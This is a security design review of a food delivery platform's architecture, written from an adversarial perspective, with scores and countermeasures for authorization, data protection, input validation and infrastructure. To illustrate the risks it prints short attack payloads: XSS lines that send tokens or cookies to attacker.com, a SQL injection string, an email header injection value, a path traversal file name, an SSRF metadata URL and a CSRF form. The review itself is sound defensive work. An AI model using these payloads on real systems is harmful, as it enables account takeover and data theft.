# Security Review: FoodConnect システム設計書
**Reviewer**: Security Architect (Adversarial Perspective)
**Date**: 2026-02-10
**Evaluation Mode**: Architecture-level security design review

## Executive Summary

From an attacker's perspective, this design document presents multiple exploitable security gaps, particularly in **authorization controls**, **data protection**, and **infrastructure security specifications**. Critical issues include missing endpoint-level authorization, lack of IDOR prevention mechanisms, unspecified JWT storage (enabling XSS-based token theft), and absence of rate limiting specifications for brute-force protection.

**Overall Security Posture**: Significant security risks requiring immediate attention before production deployment.

---

## Scoring Summary

| Criterion | Score | Severity |
|-----------|-------|----------|
| 1. Threat Modeling (STRIDE) | **2** | Significant |
| 2. Authentication & Authorization Design | **2** | Significant |
| 3. Data Protection | **2** | Significant |
| 4. Input Validation Design | **2** | Significant |
| 5. Infrastructure & Dependency Security | **2** | Significant |

**Overall Score**: **2.0 / 5.0** (Significant issues: High likelihood of successful attack in production)

---

## 1. Threat Modeling (STRIDE) — Score: 2/5

### Attack Vector Analysis

#### Spoofing (Identity)
**Status**: Partial protection
**Attack Vector**: JWT authentication is specified, but token storage mechanism is undefined. If tokens are stored in localStorage (common practice), an attacker can exploit XSS vulnerabilities to steal tokens and impersonate users indefinitely (24-hour validity window).

**Exploitability**: High. XSS + localStorage token theft is a well-known attack chain.

#### Tampering (Data Integrity)
**Status**: Missing protection
**Attack Vector**: No integrity verification mechanisms are specified for:
- Order modification after submission (can an attacker modify `deliveryAddress` or `items[]` after order creation?)
- Payment amount tampering (client-submitted `totalAmount` vs. server-calculated amount)
- Status transition validation (can a driver mark an order "DELIVERED" without GPS verification?)

**Exploitability**: High. Missing server-side validation creates tampering opportunities.

#### Repudiation (Non-repudiation)
**Status**: Insufficient
**Attack Vector**:
- Logging policy (Section 6) specifies recording "ユーザーID、リクエストパス、レスポンスステータス、処理時間" but does **not specify request body logging** for critical operations (payment, order status changes).
- No mention of **log immutability** or **log integrity protection**. An attacker with admin access could modify/delete logs to cover tracks.
- Missing specifications for **change history auditing** (who changed order status? who initiated refund?).

**Exploitability**: Medium. Insufficient audit trails enable attackers to deny malicious actions.

#### Information Disclosure
**Status**: Multiple exposures
**Attack Vectors**:
1. **Verbose Error Messages**: Section 6 states "クライアントにはエラーコード + メッセージを返却" without specifying **sanitization of internal details**. Stack traces, database errors, or file paths could leak in error messages.
2. **Missing PII Masking in Logs**: No specification for masking sensitive data (email, phone, card_last4, deliveryAddress) in application logs.
3. **Transaction ID Exposure**: `payments.transaction_id` (Section 4) is stored without access control specifications—could leak payment processor details to unauthorized users.

**Exploitability**: High for error-based information disclosure, Medium for log-based leaks.

#### Denial of Service
**Status**: Missing protection
**Attack Vectors**:
1. **No Rate Limiting Specifications**: Section 3 mentions API Gateway performs "レート制限" but provides **no rate limit values, scope (per-IP? per-user?), or enforcement policy**.
2. **Missing Brute-Force Protection**: No account lockout policy or login attempt throttling specified for `/api/v1/auth/login`.
3. **No Resource Quotas**: Unlimited order creation, unlimited payment attempts, unlimited API calls per user.

**Exploitability**: High. Absence of rate limiting enables brute-force and resource exhaustion attacks.

#### Elevation of Privilege
**Status**: Critical gaps (see Section 2 for detailed authorization analysis)
**Attack Vectors**:
- Missing endpoint-level authorization enables IDOR, horizontal privilege escalation, and vertical privilege escalation.
- No role boundary enforcement specifications.

**Exploitability**: Critical. Authorization gaps are the most severe attack vector in this design.

### Countermeasures
1. **Specify JWT storage mechanism**: Mandate httpOnly, Secure, SameSite cookies (not localStorage)
2. **Define integrity validation**: Server-side recalculation of order amounts, state machine validation for status transitions
3. **Enhance audit logging**: Log request bodies for critical operations, implement write-once logging, add change history tables
4. **Sanitize error messages**: Define error message templates that exclude internal details
5. **Specify rate limiting**: Define per-endpoint rate limits (e.g., 10 login attempts/hour, 100 API calls/minute per user)
6. **Implement brute-force protection**: Account lockout after 5 failed login attempts, exponential backoff

---

## 2. Authentication & Authorization Design — Score: 2/5

### Critical Authorization Gaps

#### Missing Endpoint-Level Authorization

**Attack Vector**: The design document specifies JWT authentication ("API は JWT トークンによる認証必須") but **does not specify authorization requirements for individual endpoints**. From an attacker's perspective, this creates multiple exploitation opportunities:

##### GET /api/v1/orders — Horizontal Privilege Escalation
**Missing Specification**: No authorization check ensuring users can only retrieve **their own orders**.

**Attack Scenario**:
1. Attacker authenticates as Customer A (obtains valid JWT)
2. Attacker calls `GET /api/v1/orders` and receives all accessible orders
3. If authorization is not implemented, attacker may receive:
   - All orders in the system, OR
   - Orders from other customers (information disclosure)

**Exploitability**: High. Common IDOR vulnerability pattern.

**Expected Specification (missing)**: "Users with role CUSTOMER can only retrieve orders where `orders.customer_id = authenticated_user_id`. RESTAURANT role can retrieve orders where `orders.restaurant_id` matches their restaurant. ADMIN can retrieve all orders."

##### POST /api/v1/orders — Impersonation & Fraud
**Missing Specification**: No validation that `customer_id` matches the authenticated user.

**Attack Scenario**:
1. Attacker authenticates as Customer A
2. Attacker submits `POST /api/v1/orders` with manipulated `customer_id` (or relies on server to extract from JWT)
3. If server accepts arbitrary `customer_id` from request body, attacker can:
   - Create orders on behalf of other users (fraud)
   - Trigger fraudulent charges to victim payment methods

**Exploitability**: Critical if `customer_id` is client-supplied, Low if server extracts from JWT (but specification is ambiguous).

**Expected Specification (missing)**: "Server MUST extract `customer_id` from authenticated JWT token. Client-supplied `customer_id` in request body MUST be rejected."

##### PATCH /api/v1/orders/{orderId}/status — Status Manipulation
**Missing Specification**: No role-based authorization for status transitions.

**Attack Scenario**:
1. Attacker authenticates as Customer A
2. Attacker calls `PATCH /api/v1/orders/{orderId}/status` with `status: "COMPLETED"` on their own pending order
3. If authorization is not implemented:
   - Attacker marks order as completed without delivery
   - Payment is finalized, but no food is delivered (theft)

**Alternative Attack**:
1. Attacker authenticates as Driver B
2. Attacker calls `PATCH /api/v1/orders/{orderId}/status` with `status: "CANCELLED"` on any order
3. If authorization allows drivers to cancel orders, attacker disrupts service

**Exploitability**: High. Status manipulation enables fraud and service disruption.

**Expected Specification (missing)**: "Status transitions MUST be role-gated:
- CUSTOMER can only cancel orders in PENDING/CONFIRMED state
- RESTAURANT can transition CONFIRMED → PREPARING
- DRIVER can transition DELIVERING → COMPLETED
- ADMIN can perform any transition
Each transition MUST verify the requesting user's role and ownership (e.g., driver can only update orders assigned to them)."

##### POST /api/v1/payments — Payment Manipulation
**Missing Specification**: No validation that `orderId` belongs to the authenticated user.

**Attack Scenario**:
1. Attacker authenticates as Customer A
2. Attacker discovers valid order ID belonging to Customer B (via enumeration or leaked ID)
3. Attacker calls `POST /api/v1/payments` with `orderId: <Customer B's order>`
4. If authorization is not implemented:
   - Attacker's payment method is charged for Customer B's order (fraud)
   - OR Customer B's order is marked as paid without actual payment (financial loss)

**Exploitability**: Critical. Enables financial fraud.

**Expected Specification (missing)**: "Payment creation MUST verify `orders.customer_id = authenticated_user_id` before processing payment. Reject payments for orders not owned by the requesting user."

#### Missing IDOR Prevention Specifications

**Attack Vector**: All resource access endpoints use UUID identifiers (`{orderId}`) but lack **object-level authorization specifications**.

**General IDOR Attack Pattern**:
1. Attacker creates legitimate order (e.g., `order_123`)
2. Attacker enumerates or predicts other order UUIDs (e.g., sequential generation, leaked IDs)
3. Attacker accesses `GET /api/v1/orders` or `PATCH /api/v1/orders/{orderId}/status` with victim's order ID
4. Without object-level authorization, attacker accesses/modifies victim's orders

**Exploitability**: High. UUIDs provide limited protection if authorization is missing.

**Countermeasure**: Specify that **every resource access endpoint MUST verify ownership** before returning/modifying data:
- "GET /api/v1/orders MUST filter by authenticated user's customer_id/restaurant_id/driver assignment"
- "PATCH /api/v1/orders/{orderId}/status MUST verify the order belongs to or is assigned to the authenticated user"

#### Missing Role Boundary Enforcement

**Attack Vector**: The `users.role` field defines four roles (CUSTOMER, RESTAURANT, DRIVER, ADMIN), but **no specifications exist for role-based access control**.

**Vertical Privilege Escalation Scenario**:
1. Attacker authenticates as CUSTOMER
2. Attacker calls admin-only endpoint (e.g., hypothetical `GET /api/v1/admin/users`)
3. If role checking is not implemented, attacker gains admin privileges

**Horizontal Privilege Escalation Scenario**:
1. Attacker authenticates as DRIVER
2. Attacker accesses RESTAURANT-only endpoints (e.g., menu management)
3. Without role enforcement, attacker crosses role boundaries

**Exploitability**: High if admin endpoints exist (likely), Medium for cross-role access.

**Countermeasure**: Define role-based access matrix for all endpoints in the design document.

#### JWT Storage Vulnerability (XSS-based Token Theft)

**Attack Vector**: Section 5 specifies JWT authentication with 24-hour token validity but **does not specify token storage mechanism** (localStorage vs. httpOnly cookies).

**Attack Scenario**:
1. Application stores JWT in localStorage (common but insecure practice)
2. Attacker exploits XSS vulnerability in frontend (e.g., reflected XSS in search query)
3. Attacker injects JavaScript: `fetch('https://attacker.com/?token=' + localStorage.getItem('jwt'))`
4. Attacker steals JWT token (24-hour validity)
5. Attacker impersonates victim for 24 hours (bypasses MFA if implemented)

**Exploitability**: High. XSS + localStorage token theft is a standard attack chain.

**Countermeasure**: Specify token storage mechanism in design document:
- "JWT MUST be stored in httpOnly, Secure, SameSite=Strict cookies"
- "Refresh tokens MUST be stored with same cookie attributes"
- "Frontend MUST NOT access tokens via JavaScript"

#### Missing Session Management Specifications

**Attack Vector**: No specifications for:
- Session timeout (JWT expires in 24 hours, but what about idle timeout?)
- Concurrent session limits (can one user have 100 active sessions?)
- Session invalidation on logout (is there a token revocation mechanism?)
- Token refresh security (how are refresh tokens protected?)

**Exploitability**: Medium. Long-lived sessions increase attack window.

**Countermeasure**: Define session management policy in design document.

### Countermeasures Summary
1. **Add endpoint-level authorization matrix**: Specify required roles and ownership validation for each API endpoint
2. **Implement IDOR prevention**: Mandate object-level authorization checks for all resource access operations
3. **Specify JWT storage mechanism**: Require httpOnly, Secure, SameSite cookies
4. **Define role enforcement policy**: Specify role-based access control implementation
5. **Add session management specifications**: Idle timeout, concurrent session limits, token revocation

---

## 3. Data Protection — Score: 2/5

### Encryption Gaps

#### Data at Rest
**Missing Specifications**:
- PostgreSQL encryption: No mention of Transparent Data Encryption (TDE) or encryption at rest
- Redis encryption: No specification for encrypted cache storage
- S3 bucket encryption: Mentioned "S3 + CloudFront" for static files but no encryption specification

**Attack Vector**: If an attacker gains physical access to backups or storage volumes (e.g., stolen disk, misconfigured backup), unencrypted data is fully readable.

**Exploitability**: Low likelihood (requires infrastructure breach), High impact (full data disclosure).

**Countermeasure**: Specify encryption at rest:
- "RDS MUST use encryption at rest with AWS KMS-managed keys"
- "ElastiCache MUST enable encryption at rest"
- "S3 buckets MUST use SSE-S3 or SSE-KMS encryption"

#### Data in Transit
**Specified**: "すべての通信は HTTPS で暗号化" (Section 7)

**Missing Specifications**:
- TLS version requirements (TLS 1.2 minimum? TLS 1.3 preferred?)
- Cipher suite restrictions (disable weak ciphers?)
- Internal service-to-service communication encryption (backend services to database, service-to-service calls)

**Attack Vector**: If internal communication is unencrypted, an attacker with network access (e.g., compromised EC2 instance in same VPC) can sniff sensitive data.

**Exploitability**: Medium (requires network breach).

**Countermeasure**: Specify TLS requirements and internal encryption policies.

### Sensitive Data Exposure

#### PII in Logs
**Attack Vector**: Section 6 specifies logging "ユーザーID、リクエストパス、レスポンスステータス、処理時間" but **does not specify PII masking**.

**Scenario**: Access logs may inadvertently log:
- Email addresses in request paths (e.g., `/api/v1/users?email=victim@example.com`)
- Delivery addresses in request bodies (if bodies are logged for debugging)
- Card_last4 in payment logs

**Exploitability**: Medium. Logs are often stored in centralized logging systems with broad access.

**Countermeasure**: "Application logs MUST mask PII fields (email, phone, address, card_last4) using redaction or hashing before logging."

#### Payment Data Storage
**Specified**: `payments.card_last4` is stored (Section 4)

**Missing Specifications**:
- Full card number storage prohibition (PCI DSS compliance)
- CVV storage prohibition
- Tokenization requirements (using payment processor tokens instead of raw card data)

**Attack Vector**: If full card data is stored (not explicitly prohibited), database breach exposes card numbers.

**Exploitability**: Critical if full card data is stored (specification is ambiguous).

**Countermeasure**: Explicitly prohibit full card data storage:
- "Full card numbers and CVV MUST NOT be stored in database"
- "Payment processing MUST use tokenization via third-party payment gateway"
- "Only card_last4 and payment gateway token may be stored"

#### Delivery Address Privacy
**Attack Vector**: `orders.delivery_address` (TEXT field) is stored indefinitely without privacy controls.

**Scenario**: An attacker who gains read access to the `orders` table can harvest delivery addresses for:
- Physical stalking
- Targeted phishing (knowing victim's location)
- Resale of address lists

**Exploitability**: Medium (requires database breach).

**Countermeasure**: Define data retention and access control policies:
- "Delivery addresses MUST be encrypted at rest"
- "Access to delivery addresses MUST be role-gated (only assigned driver and customer can view)"
- "Delivery addresses MUST be deleted or anonymized 90 days after order completion"

### Access Control Gaps

**Missing Specifications**:
- Database access control (who can query which tables?)
- Column-level encryption for sensitive fields (email, phone, delivery_address, card_last4)
- Service-to-service authentication (can any backend service query any database table?)

**Attack Vector**: If backend services have unrestricted database access, a compromised service (e.g., Notification Service exploited via dependency vulnerability) can exfiltrate all customer data.

**Exploitability**: High (service compromise + overprivileged database access).

**Countermeasure**: Define least-privilege database access:
- "Each backend service MUST use dedicated database credentials with table-level access restrictions"
- "Notification Service can only read users.email and users.phone (cannot access orders or payments)"
- "Payment Service can only write to payments table (cannot read other services' data)"

### Countermeasures Summary
1. **Specify encryption at rest**: RDS, ElastiCache, S3 encryption requirements
2. **Define TLS requirements**: Minimum TLS 1.2, cipher suite restrictions, internal service encryption
3. **Implement PII masking in logs**: Redact sensitive fields before logging
4. **Prohibit full card data storage**: Enforce tokenization, explicitly forbid full card numbers
5. **Add data retention policy**: Auto-delete delivery addresses after 90 days
6. **Define database access control**: Least-privilege service accounts, column-level encryption

---

## 4. Input Validation Design — Score: 2/5

### Missing Input Validation Policy

**Attack Vector**: The design document provides **no specifications for input validation, sanitization, or output escaping**.

From an attacker's perspective, the following injection opportunities exist:

#### SQL Injection Vectors

**Vulnerable Endpoints**:
- `GET /api/v1/orders` (potential query parameter filtering)
- Order search/filter functionality (implied but not documented)

**Attack Scenario**:
1. Attacker submits crafted input to search orders by status:
   ```
   GET /api/v1/orders?status=PENDING' OR '1'='1
   ```
2. If input is not parameterized, attacker extracts all orders (authorization bypass)

**Mitigation Status**: Partial. Section 2 specifies Hibernate 6.2 (ORM), which provides parameterized queries by default, but **no explicit requirement for parameterized queries is documented**.

**Exploitability**: Low (Hibernate mitigates by default), Medium if raw SQL is used anywhere.

**Countermeasure**: "All database queries MUST use parameterized statements or ORM methods. Direct SQL concatenation is prohibited."

#### JSON Injection / Mass Assignment

**Attack Vector**: `POST /api/v1/orders` accepts `{ restaurantId, items[], deliveryAddress }` but **no specification for input structure validation**.

**Attack Scenario**:
1. Attacker submits additional fields beyond specified schema:
   ```json
   {
     "restaurantId": "123",
     "items": [...],
     "deliveryAddress": "...",
     "totalAmount": 0.01,
     "status": "COMPLETED"
   }
   ```
2. If backend performs mass assignment (e.g., `Order order = objectMapper.readValue(json, Order.class)`), attacker may:
   - Set `totalAmount` to $0.01 (payment bypass)
   - Set `status` to "COMPLETED" (order fulfillment bypass)
   - Set `customer_id` to another user (fraud)

**Exploitability**: High if mass assignment is used without allowlist validation.

**Countermeasure**: "All API endpoints MUST define explicit input schemas with allowlist validation. Reject requests containing unexpected fields."

#### XSS Vectors (Design-Level)

**Attack Vector**: `orders.delivery_address` is a TEXT field accepting user input. If this field is displayed in:
- Restaurant staff tablet UI
- Driver mobile app
- Admin dashboard

Without output escaping, attacker can inject XSS payloads:

**Attack Scenario**:
1. Attacker creates order with malicious delivery address:
   ```
   deliveryAddress: "<script>fetch('https://attacker.com/?cookie='+document.cookie)</script>"
   ```
2. Restaurant staff views order on tablet UI
3. If UI does not escape HTML, script executes in staff's browser
4. Attacker steals staff session token, gains restaurant account access

**Exploitability**: Medium (requires XSS + localStorage token storage).

**Countermeasure**: "All user-generated content (delivery_address, restaurant names, menu items) MUST be escaped for HTML context before rendering. Implement Content Security Policy (CSP) to mitigate XSS impact."

#### Email Injection

**Attack Vector**: `POST /api/v1/auth/password-reset` accepts email address without validation specifications.

**Attack Scenario**:
1. Attacker submits crafted email:
   ```
   email: "victim@example.com\nBcc: attacker@evil.com"
   ```
2. If email headers are not sanitized, attacker injects additional recipients (password reset link sent to attacker)

**Exploitability**: Medium (depends on email library implementation).

**Countermeasure**: "Email inputs MUST be validated against RFC-compliant regex. Reject emails containing newlines, control characters, or header injection patterns."

### Missing File Upload Validation (Implied Feature)

**Potential Attack Vector**: Section 6 mentions "静的ファイル (画像、メニュー写真) は S3 + CloudFront 経由で配信" implying file upload functionality, but **no security specifications exist**.

**Attack Scenarios**:
1. **Path Traversal**: Attacker uploads file with name `../../../../etc/passwd`
2. **Malicious File Types**: Attacker uploads executable files (`.exe`, `.sh`) disguised as images
3. **XXE Attacks**: Attacker uploads malicious SVG containing XML External Entity payload
4. **Oversized Files**: Attacker uploads 10GB image to exhaust storage

**Exploitability**: High if file upload exists without validation.

**Countermeasure**: Define file upload security requirements:
- "File uploads MUST validate file type via magic byte inspection (not file extension)"
- "Uploaded files MUST be scanned for malware"
- "File names MUST be sanitized to prevent path traversal"
- "Maximum file size MUST be enforced (e.g., 5MB per image)"

### Countermeasures Summary
1. **Mandate parameterized queries**: Explicitly require parameterized SQL
2. **Define input validation schemas**: Allowlist validation for all API endpoints
3. **Specify output escaping policy**: HTML escaping for user-generated content
4. **Add email validation**: RFC-compliant validation, header injection prevention
5. **Define file upload security**: File type validation, size limits, malware scanning
6. **Implement CSP**: Content Security Policy to mitigate XSS impact

---

## 5. Infrastructure & Dependency Security — Score: 2/5

### Infrastructure Security Assessment

| Component | Configuration | Security Measure | Status | Risk Level | Attack Vector |
|-----------|---------------|------------------|--------|------------|---------------|
| **Database (RDS)** | Multi-AZ, Read Replica | Access control, encryption, backup | **Partial** | **High** | Missing: encryption at rest specification, network isolation (VPC/security group rules), connection encryption (SSL/TLS), backup retention/encryption policy, IAM authentication |
| **Cache (ElastiCache)** | Redis 7.0 | Network isolation, authentication | **Missing** | **High** | No authentication mechanism specified (Redis AUTH?), no encryption at rest, no encryption in transit, no network isolation specifications. Attacker with VPC access can read/modify cache contents (session hijacking) |
| **Storage (S3)** | Static file hosting | Access policies, encryption at rest | **Missing** | **High** | No bucket access policy (public read? authenticated access?), no encryption specification, no versioning/lifecycle policy, no CloudFront signed URLs. Attacker may enumerate bucket contents, upload malicious files, or exfiltrate uploaded images |
| **API Gateway** | Routing, rate limiting | Authentication, rate limiting, CORS | **Partial** | **High** | Rate limiting mentioned but not specified (no values, no scope), no CORS policy specified (vulnerable to CSRF if misconfigured), no API key management, no DDoS protection strategy |
| **Secrets Management** | None specified | Rotation, access control, storage | **Missing** | **Critical** | No secrets management solution specified (AWS Secrets Manager? Systems Manager Parameter Store?). Without proper secrets management, credentials may be hardcoded in code/environment variables, enabling credential theft via code repository breach or container inspection |
| **Dependencies** | Spring Security 6.1, Hibernate 6.2, Jackson 2.15 | Version management, vulnerability scanning | **Missing** | **High** | No dependency vulnerability scanning process, no update policy, no SBOM (Software Bill of Materials), no process for addressing CVEs in dependencies. Attacker exploits known vulnerabilities in outdated libraries |

### Critical: Missing Secrets Management

**Attack Vector**: The design document specifies **no secrets management solution** for:
- Database credentials (PostgreSQL, Redis)
- JWT signing key
- Payment gateway API keys
- Third-party service credentials (SMS, push notification providers)

**Attack Scenarios**:

1. **Hardcoded Credentials in Code**:
   - Developer commits database password in `application.properties`
   - Attacker gains access to source code repository (e.g., GitHub breach, insider threat)
   - Attacker extracts credentials, directly accesses production database

2. **Environment Variable Exposure**:
   - Credentials stored in ECS task definition environment variables
   - Attacker exploits SSRF vulnerability to access ECS metadata endpoint
   - Attacker retrieves credentials via `http://169.254.170.2/v2/metadata`

3. **No Key Rotation**:
   - JWT signing key is static, never rotated
   - Attacker obtains old signing key from compromised container
   - Attacker forges JWT tokens indefinitely (no rotation invalidates key)

**Exploitability**: Critical. Secrets management gaps are a common root cause of data breaches.

**Countermeasure**: Define secrets management requirements:
- "All secrets MUST be stored in AWS Secrets Manager or Systems Manager Parameter Store"
- "Application MUST retrieve secrets at runtime (not hardcoded or in environment variables)"
- "Database credentials MUST use IAM authentication where possible"
- "JWT signing keys MUST be rotated every 90 days"
- "Secret access MUST be logged and audited"

### Dependency Vulnerability Management

**Attack Vector**: Section 2 specifies library versions (Spring Security 6.1, Hibernate 6.2, Jackson 2.15) but **no process for vulnerability management**.

**Attack Scenario**:
1. CVE is disclosed for Jackson 2.15 (e.g., remote code execution via deserialization)
2. Without vulnerability scanning, team is unaware of CVE
3. Attacker exploits vulnerability to gain remote code execution on backend services

**Exploitability**: High. Dependency vulnerabilities are frequently exploited in production.

**Countermeasure**: Define dependency security process:
- "Dependency versions MUST be tracked in Software Bill of Materials (SBOM)"
- "CI/CD pipeline MUST include automated vulnerability scanning (e.g., OWASP Dependency-Check, Snyk)"
- "Critical CVEs MUST be patched within 7 days, High CVEs within 30 days"
- "Production deployments MUST be blocked if critical vulnerabilities are detected"

### Network Security Gaps

**Missing Specifications**:
- VPC configuration (public subnets? private subnets?)
- Security group rules (which services can communicate?)
- Network segmentation (is database in isolated subnet?)
- Egress filtering (can compromised service make arbitrary outbound connections?)

**Attack Vector**: Without network segmentation, a compromised service (e.g., Notification Service exploited via dependency CVE) can:
- Access database directly (data exfiltration)
- Pivot to other backend services (lateral movement)
- Exfiltrate data to external attacker-controlled server

**Exploitability**: High (post-compromise lateral movement).

**Countermeasure**: Define network architecture:
- "Backend services MUST run in private subnets with no direct internet access"
- "Database MUST be isolated in dedicated subnet with security group allowing only backend service access"
- "Egress traffic MUST be filtered via NAT Gateway with allowlist of required external domains"

### Container Security

**Missing Specifications**:
- Base image security (using minimal images? official images?)
- Container scanning (vulnerability scanning in CI/CD?)
- Runtime security (read-only filesystems? non-root user?)
- Image signing/verification

**Attack Vector**: Without container security practices, attacker may:
- Exploit vulnerable packages in base image
- Inject backdoor into Docker image via compromised CI/CD
- Gain root access inside container, escape to host

**Exploitability**: Medium (requires CI/CD or runtime compromise).

**Countermeasure**: Define container security requirements:
- "Docker images MUST use minimal base images (e.g., distroless, Alpine)"
- "Container images MUST be scanned for vulnerabilities before deployment"
- "Containers MUST run as non-root user"
- "Filesystems MUST be read-only where possible"

### IAM & Access Control

**Missing Specifications**:
- ECS task IAM roles (least privilege?)
- RDS IAM authentication
- S3 bucket policies
- Cross-service authentication

**Attack Vector**: Overprivileged IAM roles enable privilege escalation. If ECS task role has `s3:*` permission, attacker who compromises application can access/modify all S3 buckets.

**Exploitability**: High (post-compromise privilege escalation).

**Countermeasure**: Define IAM least-privilege policy:
- "Each ECS task MUST use dedicated IAM role with minimum required permissions"
- "S3 access MUST be restricted to specific bucket ARNs"
- "Database access MUST use IAM authentication (no password-based auth)"

### Countermeasures Summary
1. **Implement secrets management**: AWS Secrets Manager, credential rotation, IAM authentication
2. **Define dependency security process**: Automated vulnerability scanning, CVE patching SLA
3. **Specify network architecture**: VPC segmentation, security groups, egress filtering
4. **Add container security requirements**: Minimal images, vulnerability scanning, non-root execution
5. **Define IAM least-privilege policies**: Service-specific roles, resource-level permissions
6. **Specify encryption at rest/in transit**: RDS, ElastiCache, S3, inter-service communication
7. **Add API Gateway security specifications**: Rate limit values, CORS policy, DDoS protection

---

## Additional Security Concerns

### Missing Rate Limiting Specifications (Brute Force Protection)

**Attack Vector**: Section 3 mentions API Gateway performs "レート制限" but provides **no implementation details**.

**Attack Scenarios**:

1. **Credential Brute Force**:
   - Attacker attempts 10,000 login requests to `POST /api/v1/auth/login`
   - Without rate limiting, attacker tests common passwords against all user accounts
   - Successful compromise of weak-password accounts

2. **Account Enumeration**:
   - Attacker submits 100,000 requests to `POST /api/v1/auth/password-reset` with different emails
   - Response timing or error messages reveal which emails are registered
   - Attacker builds list of valid user emails for phishing

3. **Resource Exhaustion**:
   - Attacker submits 10,000 concurrent order creation requests
   - Backend services exhaust CPU/memory
   - Denial of service for legitimate users

**Exploitability**: High. Absence of rate limiting is easily exploitable.

**Countermeasure**: Define rate limiting specifications:
- "Login endpoint MUST enforce rate limit: 10 attempts per IP per hour"
- "Account lockout: 5 failed login attempts within 15 minutes locks account for 1 hour"
- "API rate limit: 100 requests per user per minute (authenticated endpoints)"
- "Global rate limit: 1,000 requests per IP per minute (public endpoints)"

### Missing CSRF Protection

**Attack Vector**: No CSRF protection mechanism is specified (CSRF tokens, SameSite cookies).

**Attack Scenario**:
1. Victim is authenticated (has valid JWT in cookie or localStorage)
2. Attacker tricks victim into visiting malicious website
3. Malicious website submits authenticated request:
   ```html
   <form action="https://foodconnect.example.com/api/v1/orders" method="POST">
     <input name="restaurantId" value="attacker-restaurant">
     <input name="totalAmount" value="9999.99">
   </form>
   <script>document.forms[0].submit()</script>
   ```
4. If CSRF protection is missing, order is created using victim's authentication

**Exploitability**: High if JWT is stored in localStorage (no SameSite protection), Medium if using cookies without CSRF tokens.

**Countermeasure**: Define CSRF protection:
- "All state-modifying endpoints (POST/PUT/PATCH/DELETE) MUST require CSRF token"
- "JWT cookies MUST use SameSite=Strict attribute"
- "Consider using Double Submit Cookie pattern"

### Missing Security Headers

**Attack Vector**: No specification for security headers (CSP, HSTS, X-Frame-Options).

**Exploitability**: Medium (enables clickjacking, XSS).

**Countermeasure**: Define required security headers:
- `Content-Security-Policy: default-src 'self'`
- `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`

---

## Positive Security Aspects

1. **Password Hashing**: bcrypt specified (Section 7)
2. **HTTPS Enforcement**: All communication over HTTPS (Section 7)
3. **JWT Authentication**: Modern token-based authentication (Section 5)
4. **Multi-AZ Database**: Availability protection (Section 6)
5. **UUID Identifiers**: Non-sequential IDs reduce enumeration risk (Section 4)

---

## Summary of Critical Recommendations

### Immediate Action Required (Critical)

1. **Define endpoint-level authorization**: Specify required roles and ownership validation for every API endpoint
2. **Implement IDOR prevention**: Mandate object-level authorization checks for all resource access
3. **Specify JWT storage mechanism**: Require httpOnly, Secure, SameSite cookies (not localStorage)
4. **Implement secrets management**: AWS Secrets Manager for all credentials, key rotation policy
5. **Define rate limiting**: Per-endpoint rate limits, account lockout, brute-force protection

### High Priority (Significant)

6. **Add input validation specifications**: Allowlist validation, parameterized queries, output escaping
7. **Specify encryption at rest**: RDS, ElastiCache, S3 encryption requirements
8. **Define network architecture**: VPC segmentation, security groups, egress filtering
9. **Implement dependency vulnerability scanning**: Automated CVE detection, patching SLA
10. **Add CSRF protection**: CSRF tokens or SameSite cookies

### Medium Priority (Moderate)

11. **Define audit logging requirements**: Log immutability, PII masking, change history
12. **Add data retention policy**: Auto-delete delivery addresses, payment data lifecycle
13. **Specify container security**: Minimal images, vulnerability scanning, non-root execution
14. **Define IAM least-privilege policies**: Service-specific roles, resource-level permissions
15. **Add security headers**: CSP, HSTS, X-Frame-Options

---

## Conclusion

From an adversarial perspective, this design document presents **significant exploitable gaps** that would enable:
- **Unauthorized data access** (missing authorization controls)
- **Account takeover** (XSS-based token theft via localStorage)
- **Financial fraud** (payment manipulation, order status tampering)
- **Credential compromise** (missing secrets management, no brute-force protection)
- **Data exfiltration** (missing encryption at rest, overprivileged service accounts)

**Overall Risk Assessment**: High likelihood of successful attack in production without addressing identified gaps.

**Recommendation**: Address all Critical and High Priority items before production deployment. Conduct security design review workshop to define missing specifications.
